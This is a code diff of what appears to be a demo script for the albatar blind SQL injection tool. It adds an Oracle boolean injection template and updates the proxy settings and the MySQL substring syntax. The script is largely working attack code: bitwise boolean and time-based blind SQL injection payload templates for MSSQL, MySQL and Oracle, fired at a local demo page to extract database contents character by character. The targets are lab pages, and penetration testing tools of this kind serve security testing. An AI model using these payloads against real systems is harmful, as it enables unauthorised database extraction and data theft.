@@ -1,9 +1,8 @@
 #!/usr/bin/env python
 
-from sys import argv, exit
 from albatar import *
 
-PROXY = '' #http://127.0.0.1:8082'
+PROXIES = '' # {'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}
 HEADERS = ['User-Agent: Mozilla/5.0']
 
 def test_state_grep(headers, body, time):
@@ -28,7 +27,7 @@ def mssql_boolean():
 
   def make_requester():
     return Requester_HTTP(
-      proxy = PROXY,
+      proxies = PROXIES,
       headers = HEADERS,
       url = 'http://127.0.0.1/demo/sqli.php?dbms=mssql&id=1${injection}',
       method = 'GET',
@@ -44,7 +43,7 @@ def mssql_time():
 
   def make_requester():
     return Requester_HTTP(
-      proxy = PROXY,
+      proxies = PROXIES,
       headers = HEADERS,
       url = 'http://127.0.0.1/demo/sqli.php?dbms=mssql&id=1${injection}',
       method = 'GET',
@@ -56,11 +55,11 @@ def mssql_time():
 
 def mysql_boolean():
 
-  template = ' and (ascii(substr((${query}),${char_pos},1))&${bit_pos})=${bit_pos}'
+  template = ' and (ascii(substring((${query}),${char_pos},1))&${bit_pos})=${bit_pos}'
 
   def make_requester():
     return Requester_HTTP(
-      proxy = PROXY,
+      proxies = PROXIES,
       headers = HEADERS,
       url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql&id=1${injection}',
       method = 'GET',
@@ -72,11 +71,11 @@ def mysql_boolean():
 
 def mysql_time():
 
-  template = ' and if(((ascii(substr((${query}),${char_pos},1))&${bit_pos})=${bit_pos}),sleep(1),1)'
+  template = ' and if(((ascii(substring((${query}),${char_pos},1))&${bit_pos})=${bit_pos}),sleep(1),1)'
 
   def make_requester():
     return Requester_HTTP(
-      proxy = PROXY,
+      proxies = PROXIES,
       headers = HEADERS,
       url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql&id=1${injection}',
       method = 'GET',
@@ -86,10 +85,27 @@ def mysql_time():
 
   return Method_bitwise(make_requester, template, num_threads=1)
 
+def oracle_boolean():
+
+  template = " AND 1=(select case when (select bitand((select ascii(substr((${query}),${char_pos})) from dual),${bit_pos}) from dual)=${bit_pos} then 1 else 0 end from dual)"
+
+  def make_requester():
+    return Requester_HTTP(
+      proxies = PROXIES,
+      headers = HEADERS,
+      url = 'http://127.0.0.1:18080/demo/sqli.php?dbms=oracle&id=1${injection}',
+      method = 'GET',
+      state_tester = test_state_grep,
+      encode_payload = quote,
+      )
+
+  return Method_bitwise(make_requester, template, num_threads=1)
+
 #sqli = MSSQL_Blind(mssql_boolean())
 #sqli = MSSQL_Blind(mssql_time())
-sqli = MySQL_Blind(mysql_boolean())
+#sqli = MySQL_Blind(mysql_boolean())
 #sqli = MySQL_Blind(mysql_time())
+sqli = Oracle_Blind(oracle_boolean())
 
 for r in sqli.exploit():
   print r
